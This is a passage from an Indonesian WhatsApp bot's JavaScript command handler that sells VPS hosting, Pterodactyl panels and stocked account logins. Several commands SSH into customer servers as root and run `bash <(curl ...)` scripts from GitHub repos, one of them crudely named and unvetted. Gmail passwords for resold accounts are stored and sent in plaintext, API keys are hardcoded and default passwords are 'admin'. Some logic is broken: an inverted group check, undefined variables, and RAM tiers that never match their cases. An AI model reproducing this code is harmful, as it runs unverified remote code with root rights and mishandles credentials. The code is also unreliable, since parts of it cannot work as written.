stream.on('close', async (code, signal) => { 
await m.reply("Berhasil install Depend silakan ketik .installtemanebula ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('11\n');
stream.write('A\n');
stream.write('Y\n');
stream.write('Y\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "swin": case "myvps": {
let teks = `
*Ready VPS Do Super Murah*
R8C2 : 25K
R8C4: 30K
R16C4: 35K
R16C8: 50K
R32C8: 70K

Keuntungan??;

FREE INSTALL THEMA DAN PANEL
FREE EGGS
FREE HIJAU NODE
BISA JUALAN PANEL SENDIRI
FREE SUBDOMAIN

*PROMO CUMA BUALN INI BULAN BESOK GAK ADA*
`
Nvidia.sendMessage(m.chat, {image: {url: "https://img1.pixhost.to/images/5735/598310570_fr3hosting.jpg"}, caption: teks, contextInfo: {
isForwarded: true, 
forwardingScore: 9999
}}, {quoted: qlive})
}
break

case "addstok": {
 if (!isOwner) return Reply('❌ Akses Ditolak! Perintah ini hanya untuk pemilik.');

 let teks = `
 ❌ *Format salah!*\nGunakan perintah:\n.addstok <NamaStok>|<Harga>|<Gmail>|<Password>|<JumlahStok>|<Kode>|<Deskripsi>\n\nContoh:\n/addstok AkunViu|5000|email@example.com|password123|10|viu|Akun Viu Premium 1 tahun
 `;
 
 const args = text.split('|'); // Menggunakan pipe sebagai pemisah argumen

 if (args.length < 7) {
 return Reply(teks); // Mengirimkan pesan jika format salah
 }

 const [name, price, gmail, password, quantity, code, description] = args;
 
 // Validasi apakah harga dan jumlah stok valid
 if (isNaN(price) || isNaN(quantity)) {
 return Reply('❌ *Harga* dan *Jumlah Stok* harus berupa angka.');
 }

 // Validasi kode unik: pastikan kode stok belum ada
 if (global.stocks && global.stocks.some(stock => stock.code === code)) {
 return Reply('❌ Kode stok ini sudah ada, silakan gunakan kode lain.');
 }

 const newStock = { 
 name, 
 price: parseInt(price), 
 gmail, 
 password, 
 quantity: parseInt(quantity), 
 sold: 0, // Menghitung stok yang terjual
 code, 
 description 
 };

 if (!global.stocks) global.stocks = []; // Pastikan stocks sudah ada
 global.stocks.push(newStock); // Menambahkan stok baru ke dalam array stocks

 // Mengirimkan pesan sukses jika stok berhasil ditambahkan
 Reply(`✅ *Stok baru berhasil ditambahkan!*\n\n📜 *Nama*: ${name}\n💸 *Harga*: Rp${price}\n📧 *Gmail*: ${gmail}\n🔒 *Password*: ${password}\n📖 *Kode*: ${code}\n📦 *Jumlah Stok*: ${quantity}\n📃 *Deskripsi*: ${description}`);
 break;
}

case "buystok": {
 if (!m.isGroup) return Reply("❌ Fitur order hanya dapat digunakan dalam private chat.");

 if (db.users[m.sender].status_deposit) {
 return Nvidia.sendMessage(m.chat, {text: "❌ Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!"});
 }
  let teks = `
 ─────────────────────────
 🎯 *Panduan Pembelian Stok* 🎯
 Untuk membeli Stok, ketik perintah berikut:
 Contoh penggunaan: *.buystok <kode>* 
 Ketik *.liststok* untuk melihat daftar stok yang tersedia.
 ─────────────────────────
 `;

 Reply(teks); // Mengirimkan pesan informasi

 // Mengambil argumen kode stok dari pesan
 const code = m.text.trim().split(' ')[1]; // Ambil kode stok setelah perintah .buystok

 if (!global.stocks || global.stocks.length === 0) {
 return Reply('❌ Tidak ada stok yang tersedia saat ini. Gunakan *.liststok* untuk melihat daftar stok.');
 }

 // Mencari stok berdasarkan kode yang diberikan
 const selectedStock = global.stocks.find(stock => stock.code === code);

 if (!selectedStock) {
 return Reply('❌ Kode stok tidak valid! Ketik *.liststok* untuk melihat daftar stok.');
 }

 // Mengecek apakah stok tersedia
 if (selectedStock.quantity <= 0) {
 return Reply('❌ Stok sudah habis! Silakan pilih stok lain.');
 }

 const amount = selectedStock.price; // Jumlah yang harus dibayar
 const formattedTime = `${new Date().toLocaleTimeString('id-ID')}`;

 const teks3 = `
 🛒 *DETAIL PEMBELIAN STOK* 🛒
 ─────────────────────────
 📜 *Nama Stok*: ${selectedStock.name}
 💰 *Harga*: Rp. ${selectedStock.price.toLocaleString('id-ID')}
 ⏰ *Batas Waktu Pembayaran*: 5menit
 ─────────────────────────
 ✅ Silakan scan QRIS di bawah untuk melanjutkan pembayaran!
 `;

 Reply(teks3);

 try {
 // API untuk membuat pembayaran
 const UrlQr = global.qrisOrderKuota;
 const paymentResponse = await axios.get(
 `https://rafaelxd.tech/api/orkut/createpayment?apikey=rafael&amount=${amount}&codeqr=${UrlQr}}`
 );

 if (!paymentResponse.data || !paymentResponse.data.result) {
 console.error('API Pembayaran Error:', paymentResponse.data);
 return Reply('❌ Gagal memproses pembayaran, coba lagi nanti.');
 }

 const paymentData = paymentResponse.data.result;

 let msgQr = await Nvidia.sendMessage(m.chat, {
 image: { url: paymentData.qrImageUrl },
 caption: teks3
 }, { quoted: m });

 db.users[m.sender].status_deposit = true;

 // Menyimpan informasi transaksi
 db.users[m.sender].saweria = {
 msg: msgQr,
 chat: m.sender,
 idDeposit: paymentData.transactionId,
 amount: paymentData.amount.toString(),
 nominal: amount,
 exp: function () {
 setTimeout(async () => {
 const user = db.users[m.sender];
 if (user.status_deposit === true && user.saweria && user.saweria.amount) {
 await Nvidia.sendMessage(user.saweria.chat, {
 text: "❌ QRIS Pembayaran telah expired! Silakan coba lagi."
 }, { quoted: user.saweria.msg });

 await Nvidia.sendMessage(user.saweria.chat, {
 delete: user.saweria.msg.key
 });

 user.status_deposit = false;
 delete user.saweria;
 }
 }, 300000); // 5 menit
 }
 };

 await db.users[m.sender].saweria.exp();

 while (db.users[m.sender].status_deposit === true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
 await sleep(15000); // Tidur selama 15 detik sebelum mengecek lagi
 const checkPayment = await axios.get(
 `https://rafaelxd.tech/api/orkut/cekstatus?apikey=rafael&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`
 );

 const reqAmount = checkPayment.data.amount;

 if (reqAmount == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;

 // Mengurangi jumlah stok setelah transaksi berhasil
 selectedStock.quantity -= 1;
 selectedStock.sold += 1; // Meningkatkan stok terjual

 if (selectedStock.quantity === 0) {
 // Jika stok habis, hapus stok dari daftar
 const stockIndex = global.stocks.indexOf(selectedStock);
 if (stockIndex !== -1) {
 global.stocks.splice(stockIndex, 1);
 }
 }

 Reply(`
 ✅ *Pembayaran Berhasil!*
 🎉 Berikut adalah informasi akun yang Anda beli:

 📧 *Gmail*: ${selectedStock.gmail}
 🔒 *Password*: ${selectedStock.password}

 🚀 Terima kasih telah melakukan pembelian! Nikmati stok Anda dengan baik.
 `);

 delete db.users[m.sender].saweria;
 break;
 }
 }
 } catch (error) {
 console.error('Error:', error);
 Reply('❌ Terjadi kesalahan saat memproses permintaan Anda. Silakan coba lagi.');
 }

 break;
}

case "liststok": case "stok": {
 if (!global.stocks || !Array.isArray(global.stocks) || global.stocks.length === 0) {
 return Reply('📂 Tidak ada stok yang tersedia.');
 }

 let listMessage = '*📂 Daftar Stok Tersedia:*\n\n';

 global.stocks.forEach((stock) => {
 if (stock.name && stock.price && stock.quantity !== undefined && stock.sold !== undefined) {
 listMessage += `
 *╭────〔 ${stock.name.toUpperCase()} 〕─*
 *┊・ Harga*: Rp${stock.price.toLocaleString('id-ID')}
 *┊・ Stok Tersedia*: ${stock.quantity}
 *┊・ Stok Terjual*: ${stock.sold}
 *┊・ Kode*: ${stock.code || 'N/A'}
 *┊・ Desk*: ${stock.description || 'Tidak ada deskripsi'}
 *┊・ Cara Pembelian*: Ketik \`.buystok ${stock.code}\` untuk membeli
 *╰┈┈┈┈┈┈┈┈*
 `;
 } else {
 console.error(`Stok tidak lengkap:`, stock);
 }
 });

 Reply(listMessage);
 break;
}

case "setharga": {
 if (!isOwner) return Reply('❌ Akses Ditolak! Perintah ini hanya untuk pemilik.');

 let teks = `
 ❌ *Format salah!*\nGunakan perintah:\n.setharga <KodeStok>|<HargaBaru>\n\nContoh:\n/setharga viu|6000
 `;

 // Memisahkan argumen yang diberikan oleh pengguna
 const args = text.split('|'); 

 if (args.length !== 2) {
 return Reply(teks); // Mengirimkan pesan jika format salah
 }

 const code = args[0].trim(); // Kode stok yang ingin diubah
 const newPrice = parseInt(args[1]); // Harga baru untuk stok

 // Validasi apakah harga valid
 if (isNaN(newPrice)) {
 return Reply('❌ *Harga baru* harus berupa angka.');
 }

 // Mencari stok berdasarkan kode
 const selectedStock = global.stocks.find(stock => stock.code && stock.code.toLowerCase() === code.toLowerCase());

 if (!selectedStock) {
 return Reply('❌ Kode stok tidak valid! Ketik *.liststok* untuk melihat daftar stok.');
 }

 // Menetapkan harga baru
 selectedStock.price = newPrice;

 // Mengirimkan pesan konfirmasi jika harga berhasil diubah
 Reply(`✅ *Harga stok berhasil diubah!*\n\n📜 *Nama Stok*: ${selectedStock.name}\n💸 *Harga Baru*: Rp${newPrice.toLocaleString('id-ID')}`);

 break;
}

case "delstok": {
 if (!isOwner) return Reply('❌ Akses Ditolak! Perintah ini hanya untuk pemilik.');

 if (!text) {
 return Reply('❌ *Format salah!*\nGunakan perintah:\n.delstok <KodeStok>\n\nContoh:\n/delstok viu');
 }

 const code = text.trim(); // Mendapatkan kode dari input pengguna

 // Mencari stok dengan kode yang diberikan
 const stockIndex = global.stocks.findIndex(stock => stock.code === code);

 if (stockIndex === -1) {
 return Reply('❌ Kode stok tidak valid! Ketik *.liststok* untuk melihat daftar stok.');
 }

 const deletedStock = global.stocks.splice(stockIndex, 1)[0]; // Menghapus stok berdasarkan index

 // Mengirimkan pesan konfirmasi setelah berhasil menghapus stok
 Reply(`✅ *Stok berhasil dihapus!*\n\n📜 *Nama*: ${deletedStock.name}\n💸 *Harga*: Rp${deletedStock.price}\n📖 *Kode*: ${deletedStock.code}\n📃 *Deskripsi*: ${deletedStock.description}`);
 break;
}
break;

case "artinama": {
 if(!text) return Reply(example("Indraa"));
 let bg = `https://api.siputzx.my.id/api/primbon/artinama?nama=${encodeURIComponent(text)}`
 const res = await fetch(bg);
 const response = await res.json();
 let teks = `Nama: ${response.data.nama}\nArti: ${response.data.arti}\n\n> NvidiaBotz`
 try {
 await Nvidia.sendMessage(m.chat, {text: teks}, {quoted: m}); // Use Sky instead of Nvidia.
 } catch (e) {
 console.log(e);
 await Reply("404. . .");
 }
}
break;

case "upswtag": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("text & bisa dengan kirim foto"))
if (/image/.test(mime)) global.imgsw = qmsg
const meta = await Nvidia.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textupsw = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.create-storywa ${i}|${meta[i].subject}`, 
description: `${meta[i].participants.length} Member`
})
}
return Nvidia.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 {botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Tag\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

case "create-storywa": case "upsw": {
if (!isCreator) return Reply(mess.owner)
if (global.textupsw == undefined) return

async function mentionStatus(jids, content) {
    let colors = ['#7ACAA7', '#6E257E', '#5796FF', '#7E90A4', '#736769', '#57C9FF', '#25C3DC', '#FF7B6C', '#55C265', '#FF898B', '#8C6991', '#C69FCC', '#B8B226', '#EFB32F', '#AD8774', '#792139', '#C1A03F', '#8FA842', '#A52C71', '#8394CA', '#243640'];
    let fonts = [0];
    let user = await Nvidia.groupMetadata(jids)
    let users = user.participants.map(v => v.id)

    let message = await Nvidia.sendMessage(
        "status@broadcast", 
        content, 
        {
            backgroundColor: colors[Math.floor(Math.random() * colors.length)], 
            font: fonts[Math.floor(Math.random() * fonts.length)], 
            statusJidList: users, 
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{
                                tag: "to",
                                attrs: { jid: jids },
                                content: undefined,
                            }]
                        },
                    ],
                },
            ],
        }
    );
        await Nvidia.relayMessage(
            jids, 
            {
                groupStatusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: message.key,
                            type: 25,
                        },
                    },
                },
            },
            {
                userJid: Nvidia.user.jid,
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "true" },
                        content: undefined,
                    },
                ],
            }
        )
}

const teks = global.textupsw
let jid = text.split("|")[0]
let nama = text.split("|")[1]

if (global.imgsw !== undefined) {
media = await Nvidia.downloadAndSaveMediaMessage(global.imgsw)
await mentionStatus(jid, {
  image: { url: media }, 
  caption: teks
});
await fs.unlinkSync(media)
} else {
await mentionStatus(jid, {
  text: teks
});
}
return m.reply(`Berhasil membuat status tag grup ${nama}`)
}
break

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await Nvidia.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

case "1gb-buyyer": case "2gb-buyyer": case "3gb-buyyer": case "4gb-buyyer": case "5gb-buyyer": case "6gb-buyyer": case "7gb-buyyer": case "8gb-buyyer": case "9gb-buyyer": case "10gb-buyyer": case "unlimited-buyyer": case "unli-buyyer": {
if (!isCreator && !isPremium && !isAkses) return Reply(mess.owner)
if (serverpanel.length < 1) return m.reply("Tidak ada server panel")
if (!text) return m.reply(example("fr3,6283XXX"))
if (!args[1]) {
let list = []
let input
let d = text.split(",")
if (d.length > 1) {
input = text.split(",")[0] + ","
input += m.mentionedJid.length > 1 ? m.mentionedJid[0] : text.split(",")[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
} else {
input = text
}
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1} ${input}`
})
}
return Nvidia.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
if (Number(args[0]) > serverpanel.length) return m.reply("Server panel tidak ditemukan")
let nomor
let usernem
let cc = args[1].split(',')
if (cc.length > 1) {
let [users, nom] = args[1].split(",")
if (!users || !nom) return m.reply(example("server username,nomor\n\nuntuk melihat server ketik *.listserver*\n\ncontoh *.1gb* 2 fr3,6283XXX"))
nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
usernem = users.toLowerCase()
} else {
usernem = args[1].toLowerCase()
nomor = m.chat
}

var onWa = await Nvidia.onWhatsApp(nomor.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor target tidak terdaftar di whatsapp!")
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}

indx = Number(args[0] - 1)
let eggs = serverpanel[indx].egg
let nestids = serverpanel[indx].nestid
let locs = serverpanel[indx].loc
let domains = serverpanel[indx].domain
let apikeys = serverpanel[indx].apikey
let capikeys = serverpanel[indx].capikey

let username = usernem
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domains + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeys
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domains + `/api/application/nests/${nestids}/eggs/` + eggs, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeys
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domains + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeys,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggs),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locs)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.chat !== nomor) {
orang = nomor
await m.reply(`Akun panel *${capital(username)}* berhasil dibuat! data username dan password sudah dikirim ke nomor ${nomor.split("@")[0]}`)
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
*🗓️ Created :* ${user.created_at.split("T")[0]}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Masa aktif panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("./akunpanel.txt", teks)
await Nvidia.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

case "installtemanightcore": case "installtemanightcore": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
 
const command = `bash <(curl https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
Reply("Memproses install *tema night core* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => { 
await Reply("Berhasil install *tema nightcore* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('1\n');
stream.write('y\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemaelysium": {
if (!isOwner) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
 
const command = `bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)`
const ress = new Client();

ress.on('ready', async () => {
Reply("Memproses install *tema Elysium* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => { 
await Reply("Berhasil install *tema Elysium* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
 stream.write('1\n');
stream.write('y\n');
stream.write('yes\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installbuyyer1": {
 if (!m.isGroup) return Reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
 if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

 function generateRandomNumber(min, max) {
 return Math.floor(Math.random() * (max - min + 1)) + min;
 }

 let amount = 5000 + generateRandomNumber(0, 0);

 // Updated API request to use new URL and API key
 const get = await axios.get(`https://www.api-nvidia.web.id/orderkuota/createpayment?apikey=${global.apiSimpelBot}&amount=${amount}&codeqr=${qrisOrderKuota}`);

 const teksPembayaran = `
 *▧ INFORMASI PEMBAYARAN*

 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Install Panel Pterodactyl
 *• Expired :* 5 menit

 *Note :*
 QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.
 `

 let msgQr = await Nvidia.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
        db.users[m.sender].status_deposit = true;
        db.users[m.sender].saweria = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: get.data.result.amount.toString(),
            exp: function () {
                setTimeout(async () => {
                    if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                        await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ Waktu pembayaran telah expired, transaksi dibatalkan!"}, {quoted: db.users[m.sender].saweria.msg});
                        await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                        db.users[m.sender].status_deposit = false;
                        await clearInterval(db.users[m.sender].saweria.exp);
                        delete db.users[m.sender].saweria;
                    }
                }, 300000); // 5 menit
            }
        };

 await db.users[m.sender].saweria.exp();

 while (db.users[m.sender].status_deposit) {
 await sleep(8000);
 
 // Updated API request to check the payment status using new API URL and API key
 const resultcek = await axios.get(`https://www.api-nvidia.web.id/orderkuota/cekstatus?apikey=${global.apiSimpelBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
 const req = await resultcek.data.amount;
 if (req == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;

 await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi panel" }, { quoted: db.users[m.sender].saweria.msg });
 delete db.users[m.sender].saweria; 

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await Nvidia.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By FR3botz\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By FR3botz\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
